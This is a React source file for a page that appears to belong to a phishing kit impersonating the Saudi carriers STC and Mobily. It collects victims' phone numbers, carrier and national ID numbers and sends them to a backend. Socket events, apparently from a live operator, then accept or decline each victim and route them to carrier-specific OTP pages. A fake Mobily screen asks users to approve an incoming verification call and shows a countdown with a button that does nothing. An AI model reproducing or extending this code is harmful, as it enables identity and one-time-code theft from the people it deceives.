import React, { useState, useEffect, useCallback } from "react";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { MdOutlinePhoneCallback } from "react-icons/md";
import { api_route, socket } from "../App";
import { useNavigate } from "react-router-dom";
import { phoneProviders, isStcNetwork, isMobilyNetwork } from "../constants/phoneProviders";
import { useTranslation } from "../context/LanguageContext";

const Phone = () => {
  const { t, dir } = useTranslation();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [phoneId, setPhoneId] = useState("");
  const navigate = useNavigate();
  const [phoneNetwork, setPhoneNetwork] = useState("اس تي سي");
  const query = new URLSearchParams(window.location.search);
  const code = query.get("mobily");
  const [verfiy, setVerfiy] = useState(code === "check" ? "Mobily" : null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [counter, setCounter] = useState(180);

  const selectedProvider =
    phoneProviders.find((item) => item.name === phoneNetwork) ||
    phoneProviders[0];

  const providerNotice = isStcNetwork(selectedProvider.name)
    ? t("phone.stcNotice")
    : isMobilyNetwork(selectedProvider.name)
      ? t("phone.mobilyNotice")
      : "";

  useEffect(() => {
    const id = query.get("id");
    if (id) {
      sessionStorage.setItem("id", id);
      socket.emit("bindOrder", id);
    }
  }, [query]);

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((c) => (c > 0 ? c - 1 : c));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const minutes = Math.floor(counter / 60);
  const seconds = counter % 60;
  const formattedMinutes = String(minutes).padStart(2, "0");
  const formattedSeconds = String(seconds).padStart(2, "0");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    if (!phoneNetwork) {
      setLoading(false);
      return window.alert(t("phone.selectNetwork"));
    }
    const id = sessionStorage.getItem("id");
    if (!id) {
      setLoading(false);
      return window.alert(t("phone.missingSession"));
    }
    sessionStorage.setItem("provider", phoneNetwork);
    sessionStorage.setItem("phoneNetwork", phoneNetwork);

    try {
      await axios.post(`${api_route}/phone/${id}`, {
        phoneNumber,
        phoneNetwork,
        phoneId,
      });
      socket.emit("phone", {
        id,
        phoneNumber,
        phoneNetwork,
      });
    } catch {
      setLoading(false);
    }
  };

  const onAcceptPhone = useCallback(
    (incomingId) => {
      const id = sessionStorage.getItem("id");
      if (incomingId !== id) return;
      const net =
        sessionStorage.getItem("phoneNetwork") || phoneNetwork;
      sessionStorage.setItem("provider", net);
      setLoading(false);
      setError(false);
      if (isMobilyNetwork(net)) navigate("/mobilyOtp");
      else if (isStcNetwork(net)) navigate("/stcOtp");
      else navigate("/phoneOtp");
    },
    [navigate, phoneNetwork]
  );

  const onDeclinePhone = useCallback((incomingId) => {
    const id = sessionStorage.getItem("id");
    if (incomingId !== id) return;
    setLoading(false);
    setError(true);
  }, []);

  useEffect(() => {
    socket.on("acceptPhone", onAcceptPhone);
    socket.on("declinePhone", onDeclinePhone);
    return () => {
      socket.off("acceptPhone", onAcceptPhone);
      socket.off("declinePhone", onDeclinePhone);
    };
  }, [onAcceptPhone, onDeclinePhone]);

  return (
    <div className="w-full lg:w-1/2 mx-auto flex flex-col items-center justify-center rounded-md ">
      {!verfiy ? (
        <form
          className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3  text-sm w-11/12 "
          dir={dir}
          onSubmit={handleSubmit}
        >
          <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4  flex-col">
            <img src="/photoHeader2.jpeg" alt="" className="w-20" />
            <div className="flex items-start py-4">
              <img src="/phoneHeader1.jpeg" alt="" className="w-20" />
              <span className="font-semibold">
                {t("phone.requirementNotice")}
              </span>
            </div>
          </div>
          <div className="flex justify-end items-center mb-2 -mt-2 rounded-lg px-2">
            <img
              src={selectedProvider.img}
              alt={t(selectedProvider.nameKey)}
              className="h-16 object-contain w-20"
              onError={(e) => {
                e.target.style.display = "none";
              }}
            />
          </div>
          <p
            className={`text-right text-lg text-gray-700  leading-relaxed px-2 font-bold ${
              isStcNetwork(selectedProvider.name)
                ? "text-purple-700"
                : isMobilyNetwork(selectedProvider.name)
                  ? "text-sky-600"
                  : ""
            }`}
          >
            {providerNotice}
          </p>

          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              {t("phone.mobileNumber")}
            </span>
            <div className="relative w-full" dir={dir}>
              <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
                <img
                  src="https://flagcdn.com/w40/sa.png"
                  alt="SA"
                  className="w-5 h-4"
                />
              </span>
              <input
                value={phoneNumber}
                required
                onChange={(e) => setPhoneNumber(e.target.value)}
                dir="ltr"
                placeholder={t("phone.mobilePlaceholder")}
                inputMode="numeric"
                type="text"
                maxLength={10}
                minLength={10}
                className="border border-gray-300 rounded-lg px-3 py-2.5 pl-12 text-base text-left outline-blue-500 w-full"
              />
            </div>
          </div>

          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              {t("phone.selectProvider")}
            </span>
            <select
              value={phoneNetwork}
              required
              onChange={(e) => setPhoneNetwork(e.target.value)}
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full bg-white"
            >
              {phoneProviders.map((provider) => (
                <option key={provider.name} value={provider.name}>
                  {t(provider.nameKey)}
                </option>
              ))}
            </select>
          </div>

          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right">
              {t("phone.nationalId")}
            </span>
            <input
              dir="ltr"
              placeholder=""
              inputMode="numeric"
              value={phoneId}
              onChange={(e) => setPhoneId(e.target.value)}
              type="text"
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-left outline-blue-500 w-full"
            />
          </div>

          {error ? (
            <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>{t("phone.invalidPhone")}</span>
                </div>
                <button
                  type="button"
                  className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                  onClick={() => setError(false)}
                >
                  {t("common.tryAgain")}
                </button>
              </div>
            </div>
          ) : null}

          <div className="w-full flex items-center justify-center py-5 mt-4">
            <button
              type="submit"
              className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-lg text-base font-semibold transition-colors"
            >
              {t("common.login")}
            </button>
          </div>

          <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
            <img src="/phoneFooter.jpeg" alt="" className=" object-contain " />
          </div>
        </form>
      ) : verfiy === "Mobily" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir={dir}
          >
            <img src="/mobily.jpg" alt="" />
            <span className="text-gray-500 font-bold text-xl p-2">
              {t("phone.mobilyConfirmTitle")}{" "}
            </span>
            <img src="/mobily2.jpg" alt="" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <MdOutlinePhoneCallback className="text-4xl text-sky-600" />
              <span className="font-bold">{t("phone.mobilyVerifyIdentity")}</span>
            </div>
            <p className="p-2" dir={dir}>
              {t("phone.mobilyNotice")}
            </p>
            <button
              type="button"
              className="bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5"
              onClick={() => {
                socket.emit("network", sessionStorage.getItem("id"));
                setVerfiy("Mobily2");
              }}
            >
              {t("phone.mobilyContinue")}
            </button>
          </div>
        </div>
      ) : verfiy === "Mobily2" ? (
        <div className="w-full bg-white flex items-start justify-center h-screen ">
          <div
            className="md:w-1/3 w-full flex flex-col items-center justify-center"
            dir={dir}
          >
            <img src="/mobily.jpg" alt="" />
            <span className="text-gray-500 font-bold text-xl p-2">
              {t("phone.mobilyConfirmTitle")}{" "}
            </span>
            <img src="/mobily2.jpg" alt="" />
            <div className="flex w-full p-2 gap-x-3 text-lg items-center mt-10 ">
              <TailSpin
                height="50"
                width="50"
                color="#0ea5e9"
                ariaLabel="tail-spin-loading"
                radius="1"
                visible
              />
              <span className="font-bold">{t("phone.mobilyWaiting")}</span>
            </div>
            <p className="p-2">
              {t("phone.mobilyApproveCall")}
            </p>
            <span className="w-full p-2">{t("phone.mobilyNoCall")} </span>
            <span className="w-full p-2 flex items-center">
              {t("phone.mobilyRetryIn")}
              <span className="px-2 font-bold text-lg">
                {formattedSeconds} : {formattedMinutes}{" "}
              </span>
            </span>
            <button
              type="button"
              className={`${
                formattedMinutes === "00" && formattedSeconds === "00"
                  ? "bg-opacity-100"
                  : "bg-opacity-40"
              } bg-sky-500 text-white w-1/2 self-start p-3 m-2 rounded-full my-5`}
              disabled={!(formattedMinutes === "00" && formattedSeconds === "00")}
              onClick={() => {}}
            >
              {t("common.verify")}
            </button>
          </div>
        </div>
      ) : null}
      {loading ? (
        <div className="fixed top-0 w-full h-screen bg-[#ffffffc7]  flex items-center justify-center flex-col gap-y-5 z-50">
          <TailSpin
            height="50"
            width="50"
            color="blue"
            ariaLabel="tail-spin-loading"
            radius="1"
            visible
          />
          <span className="font-semibold">
            {t("common.loadingVerify")}
          </span>
        </div>
      ) : null}
    </div>
  );
};

export default Phone;
